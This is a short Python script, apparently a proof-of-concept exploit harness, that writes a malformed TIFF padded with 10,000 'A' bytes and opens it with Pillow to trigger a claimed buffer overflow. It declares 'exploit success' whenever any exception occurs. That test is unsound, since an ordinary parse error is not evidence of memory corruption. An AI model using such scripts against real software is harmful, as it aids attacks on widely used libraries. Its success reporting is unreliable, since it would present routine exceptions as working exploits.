import os
from PIL import Image, TiffImagePlugin

def exploit():
    # Create a malformed TIFF file with buffer overflow potential
    buffer_overflow_data = b"II*\x00\x08\x00\x00\x00\x0e\x00\xfe\x00\x04\x00\x00\x00\x01\x00\x00\x00\x00" + b"A" * 10000
    with open("malformed.tiff", "wb") as f:
        f.write(buffer_overflow_data)

    try:
        # Attempt to open the malformed TIFF file
        img = Image.open("malformed.tiff")
        img.load()  # Trigger the buffer overflow
        print("The ACI exploit failed!!!")  # If no exception, exploit failed
    except Exception as e:
        print("The ACI exploit success!!!")  # If exception, exploit success

if __name__ == "__main__":
    exploit()
